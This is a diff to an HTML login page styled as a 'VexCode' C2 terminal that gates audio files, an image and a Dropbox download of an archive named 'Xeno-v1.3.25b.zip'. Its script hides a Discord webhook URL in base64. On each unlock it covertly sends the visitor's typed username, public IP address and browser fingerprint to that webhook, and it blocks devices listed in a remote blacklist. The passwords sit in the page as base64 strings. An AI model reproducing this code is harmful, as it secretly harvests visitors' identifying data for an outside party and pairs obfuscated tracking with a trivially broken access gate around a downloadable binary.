@@ -1,185 +1,193 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VexCode | C2 Terminal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
-    <style>
-        :root { --p: #6366f1; --s: #a855f7; --a: #22d3ee; --bg: #020202; --err: #ff4d4d; }
-        * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
-        
-        body { 
-            background-color: var(--bg); 
-            color: white; 
-            font-family: 'Fira Code', monospace; 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            overflow: hidden; 
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Access | VexCode</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #03050a;
+    font-family: 'Courier New', monospace;
+    color: #4db8ff;
+    overflow: hidden;
+  }
 
-        #v_ { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.25; }
+  /* Matrix Canvas Background */
+  #v_ { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
 
-        .box_ { 
-            position: relative;
-            width: 440px; 
-            padding: 60px 40px; 
-            border-radius: 5px; 
-            background: rgba(5, 5, 5, 0.9); 
-            border-left: 4px solid var(--p);
-            border-right: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(25px); 
-            text-align: center; 
-            z-index: 10; 
-            box-shadow: 0 0 40px rgba(0,0,0,1);
-        }
+  /* Curved outer glow frame */
+  .wrapper {
+    padding: 2px;
+    border-radius: 24px;
+    background: linear-gradient(135deg, #1e90ff, #00c6ff, #1e90ff);
+    box-shadow: 0 0 35px rgba(0, 150, 255, 0.25);
+    z-index: 10;
+  }
 
-        h2 { 
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 900; 
-            font-size: 2.2rem; 
-            margin-bottom: 40px; 
-            color: var(--a);
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            text-shadow: 2px 0 var(--p), -2px 0 var(--s);
-        }
+  /* Main Terminal Box */
+  .terminal {
+    width: 320px;
+    padding: 30px;
+    background: #0b1220;
+    border-radius: 20px;
+    box-shadow: inset 0 0 20px rgba(0, 140, 255, 0.2), 0 15px 30px rgba(0, 0, 0, 0.6);
+    text-align: center;
+  }
 
-        input { 
-            width: 100%; 
-            padding: 16px; 
-            margin-bottom: 20px; 
-            border: none;
-            border-bottom: 2px solid #222;
-            background: rgba(255, 255, 255, 0.03); 
-            color: var(--a); 
-            font-family: 'Fira Code', monospace; 
-            outline: none; 
-            transition: all 0.4s ease;
-        }
+  h2 {
+    margin: 0 0 20px 0;
+    letter-spacing: 2px;
+    font-size: 16px;
+    text-transform: uppercase;
+    color: #00c6ff;
+    text-shadow: 0 0 8px rgba(0, 198, 255, 0.6);
+  }
 
-        input:focus { 
-            border-bottom: 2px solid var(--a);
-            background: rgba(99, 102, 241, 0.05);
-        }
+  label { font-size: 11px; opacity: 0.7; display: block; text-align: left; margin-left: 5px; }
 
-        button { 
-            width: 100%; 
-            padding: 18px; 
-            border: 1px solid var(--p);
-            background: transparent;
-            color: white; 
-            font-weight: 700; 
-            font-family: 'Orbitron';
-            transition: 0.4s; 
-            text-transform: uppercase; 
-            letter-spacing: 3px;
-        }
+  input {
+    width: 100%;
+    padding: 10px;
+    margin: 6px 0 15px 0;
+    background: #050a16;
+    border: 1px solid #1e90ff;
+    border-radius: 10px;
+    color: #4db8ff;
+    box-sizing: border-box;
+    outline: none;
+    transition: 0.3s;
+  }
 
-        button:hover { 
-            background: var(--p);
-            box-shadow: 0 0 30px var(--p);
-            transform: scale(1.02);
-        }
+  input:focus { border-color: #00c6ff; box-shadow: 0 0 8px rgba(0, 198, 255, 0.6); }
 
-        #res_1, #image_area, #voice_area, #gate_msg { display: none; }
-        
-        .dl_link { 
-            display: block; 
-            padding: 15px; 
-            margin: 10px 0; 
-            border: 1px solid var(--a); 
-            color: var(--a); 
-            text-decoration: none; 
-            font-size: 0.8rem;
-            transition: 0.3s;
-        }
-        .dl_link:hover { background: var(--a); color: black; }
+  button, .dl_link {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(90deg, #1e90ff, #00c6ff);
+    font-weight: bold;
+    letter-spacing: 1px;
+    cursor: pointer;
+    color: #001428;
+    transition: 0.3s;
+    text-transform: uppercase;
+    display: inline-block;
+    text-decoration: none;
+    box-sizing: border-box;
+    margin-top: 10px;
+  }
 
-        #secret_img { 
-            max-width: 100%; 
-            border: 1px solid var(--a); 
-            margin-top: 10px;
-            box-shadow: 0 0 20px rgba(34, 211, 238, 0.3);
-        }
-    </style>
+  button:hover { box-shadow: 0 0 12px rgba(0, 198, 255, 0.8); transform: translateY(-1px); }
+
+  #res_1, #image_area, #voice_area, #gate_msg { display: none; }
+  
+  #secret_img { 
+    max-width: 100%; 
+    border-radius: 10px; 
+    border: 1px solid #1e90ff; 
+    margin-top: 15px; 
+  }
+
+  .footer { margin-top: 15px; font-size: 10px; opacity: 0.5; }
+  #err_msg { color: #ff4d4d; font-size: 10px; margin-bottom: 10px; }
+</style>
 </head>
 <body>
 
 <canvas id="v_"></canvas>
 
-<div id="gate_msg" class="box_">
-    <h2 style="color: var(--err); text-shadow: none;">BLOCKED</h2>
-    <p style="color: #888; font-size: 0.8rem;">UNAUTHORIZED HARDWARE DETECTED</p>
-</div>
+<div class="wrapper">
+  <div id="gate_msg" class="terminal">
+    <h2 style="color:#ff4d4d;">ACCESS REVOKED</h2>
+    <div style="font-size: 12px;">DEVICE_BLACKLIST_ACTIVE</div>
+    <div class="footer" id="f_denied"></div>
+  </div>
 
-<div id="login_ui" class="box_">
-    <h2>VEX_CODE</h2>
-    <input type="text" id="u_id" placeholder="SYS_USER" autocomplete="off">
-    <input type="password" id="a_key" placeholder="SEC_KEY">
-    <button id="auth_btn">INITIALIZE</button>
-    <p id="err_msg" style="color: var(--err); margin-top: 10px; font-size: 0.8rem;"></p>
-</div>
+  <div id="login_ui" class="terminal">
+    <h2>VexCode Terminal</h2>
+    <div id="err_msg"></div>
+    
+    <label>Username</label>
+    <input type="text" id="u_id" placeholder="user@domain">
 
-<div id="res_1" class="box_">
-    <h2>UNLOCKED</h2>
+    <label>Access Key</label>
+    <input type="password" id="a_key" placeholder="••••••••">
+
+    <button id="auth_btn">Authenticate</button>
+    <div class="footer" id="f_active">Encrypted session initialized</div>
+  </div>
+
+  <div id="res_1" class="terminal">
+    <h2>FILES UNLOCKED</h2>
     <a href="https://www.dropbox.com/scl/fi/adzrpc80kqfumzfg65k2z/Xeno-v1.3.25b.zip?dl=1" class="dl_link">WIN_X64_CORE</a>
-    <a href="YOUR_ANDROID_LINK" class="dl_link">ANDROID_MOBILE_DATA</a>
-</div>
+    <a href="YOUR_ANDROID_LINK" class="dl_link">ANDROID_APK</a>
+    <div class="footer">STAY SECURE</div>
+  </div>
 
-<div id="image_area" class="box_">
-    <h2>DECRYPTED</h2>
+  <div id="image_area" class="terminal">
+    <h2>DECRYPTED DATA</h2>
     <img id="secret_img" src="https://raw.githubusercontent.com/VexCodeV2/VexCodeV2.github.io/f578ab2625e3212513aefec3fdffc702a9d514f7/sys-metadata/config_042.dat.jpg" alt="Data">
-</div>
+  </div>
 
-<div id="voice_area" class="box_">
-    <h2>AUDIO_FEED</h2>
-    <p style="color: var(--a);">● STREAMING_LIVE</p>
+  <div id="voice_area" class="terminal">
+    <h2>AUDIO UPLINK</h2>
+    <div style="font-size: 12px; color:#00ff88;">🔊 STREAMING_ENCRYPTED_VOICE</div>
+    <div class="footer">CONNECTED</div>
+  </div>
 </div>
 
 <script>
 (function(){
-    // --- SECURE CONFIG ---
+    // --- SECURITY CONFIG (BASE64) ---
     const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzU2ODE2NjY4MTkwMzE2Ni9QSmxGNjFDbHp4cVhWZjY1dzZqdFplVUhVUGV3OFZrN2g0VEhmcF9kcmlyMFJFRUpxcU5nWXMyMkhyVjhpVlpLbG9tVg==";
     const _0xG = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WZXhDb2RlVjIvZjQwODE0NDE3MjBlOGI3MmY2MGJiYyYwM2YzOTE3MS9yYXcvYmxhY2tsaXN0Lmpzb24=";
     
     // Passwords
-    const _u = "VmV4Q29kZQ=="; // VexCode
+    const _u = "VmV4Q29kZQ=="; // User: VexCode
     const _p1 = "dm9pY2UuMDAy"; // voice.002
     const _p2 = "dm9pY2UuMDAz"; // voice.003
     const _p3 = "MDUzMjk1MDkuY29kZQ=="; // 05329509.code
     const _p4 = "Y29kZS4wNTMyOTUwOQ=="; // code.05329509
 
+    // --- BASE64 AUDIO SLOTS ---
     const audioAssets = {
-        "v1": "data:audio/mp3;base64,PASTE_002_HERE",
-        "v2": "data:audio/mp3;base64,PASTE_003_HERE"
+        "v1": "data:audio/mp3;base64,PASTE_VOICE_002_HERE",
+        "v2": "data:audio/mp3;base64,PASTE_VOICE_003_HERE"
     };
 
     const _d = (s) => atob(s);
     let ip4 = "N/A";
 
-    function getFingerprint() { return btoa(navigator.userAgent).substring(0, 12).toUpperCase(); }
+    function getFingerprint() { return btoa(navigator.userAgent).substring(0, 10).toUpperCase(); }
 
     async function _log(t, color) {
-        const embed = {
-            title: t,
-            description: `**User:** \`${document.getElementById('u_id').value}\`\n**IP:** \`${ip4}\`\n**ID:** \`${getFingerprint()}\``,
-            color: color,
-            timestamp: new Date()
+        const payload = {
+            embeds: [{
+                title: t,
+                description: `**User:** \`${document.getElementById('u_id').value}\`\n**IP:** \`${ip4}\`\n**ID:** \`${getFingerprint()}\``,
+                color: color,
+                timestamp: new Date()
+            }]
         };
-        try { await fetch(_d(_0xW), { method: "POST", headers: {'Content-Type': 'application/json'}, body: JSON.stringify({embeds: [embed]}) }); } catch(e){}
+        try { await fetch(_d(_0xW), { method: "POST", headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }); } catch(e){}
     }
 
     async function securityCheck() {
         try {
             const res = await fetch(`${_d(_0xG)}?v=${Date.now()}`);
             const bl = await res.json();
-            if (bl.includes(ip4) || bl.includes(getFingerprint())) {
+            const f = getFingerprint();
+            if (bl.includes(ip4) || bl.includes(f)) {
                 document.getElementById('login_ui').style.display = 'none';
                 document.getElementById('res_1').style.display = 'none';
                 document.getElementById('image_area').style.display = 'none';
+                document.getElementById('voice_area').style.display = 'none';
                 document.getElementById('gate_msg').style.display = 'block';
                 return true;
             }
@@ -188,6 +196,9 @@
     }
 
     window.onload = async () => {
+        const f = getFingerprint();
+        document.getElementById('f_active').innerText = `NODE: ${f}`;
+        document.getElementById('f_denied').innerText = `NODE: ${f}`;
         try { const r = await fetch('https://api.ipify.org?format=json').then(res => res.json()); ip4 = r.ip; } catch(e){}
         if (!(await securityCheck())) setInterval(securityCheck, 5000);
     };
@@ -195,32 +206,33 @@
     document.getElementById('auth_btn').onclick = function() {
         const u = document.getElementById('u_id').value;
         const p = document.getElementById('a_key').value;
+        const err = document.getElementById('err_msg');
         
-        if (u !== _d(_u)) { document.getElementById('err_msg').innerText = ">> USER_NOT_FOUND"; return; }
+        if (u !== _d(_u)) { err.innerText = "INVALID USER"; return; }
 
         if (p === _d(_p1)) {
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('voice_area').style.display = 'block';
             if(audioAssets.v1.length > 50) new Audio(audioAssets.v1).play();
-            _log("🔓 Voice 002", 10551551);
+            _log("🔓 Voice Feed 002", 10551551);
         } 
         else if (p === _d(_p2)) {
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('voice_area').style.display = 'block';
             if(audioAssets.v2.length > 50) new Audio(audioAssets.v2).play();
-            _log("🔓 Voice 003", 10551551);
+            _log("🔓 Voice Feed 003", 10551551);
         }
         else if (p === _d(_p3)) {
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('res_1').style.display = 'block';
-            _log("🔓 Downloads", 5763719);
+            _log("🔓 Download Access", 5763719);
         }
         else if (p === _d(_p4)) {
             document.getElementById('login_ui').style.display = 'none';
             document.getElementById('image_area').style.display = 'block';
-            _log("🔓 Visual Link", 16776960);
+            _log("🔓 Visual Link Active", 16776960);
         }
-        else { document.getElementById('err_msg').innerText = ">> ACCESS_KEY_REJECTED"; }
+        else { err.innerText = "ACCESS DENIED"; }
     };
 })();
 
@@ -230,11 +242,11 @@ const x = c.getContext('2d');
 c.width = window.innerWidth; c.height = window.innerHeight;
 const drops = Array(Math.floor(c.width / 16)).fill(1);
 setInterval(() => {
-    x.fillStyle = 'rgba(0, 0, 0, 0.1)'; x.fillRect(0, 0, c.width, c.height);
-    x.fillStyle = '#6366f1';
+    x.fillStyle = 'rgba(0,0,0,0.1)'; x.fillRect(0,0,c.width,c.height);
+    x.fillStyle = '#1e90ff';
     drops.forEach((y, i) => {
-        x.fillText(String.fromCharCode(Math.random() * 128), i * 16, y * 16);
-        if (y * 16 > c.height && Math.random() > 0.98) drops[i] = 0;
+        x.fillText(String.fromCharCode(Math.random()*128), i*16, y*16);
+        if (y*16 > c.height && Math.random() > 0.98) drops[i] = 0;
         drops[i]++;
     });
 }, 35);
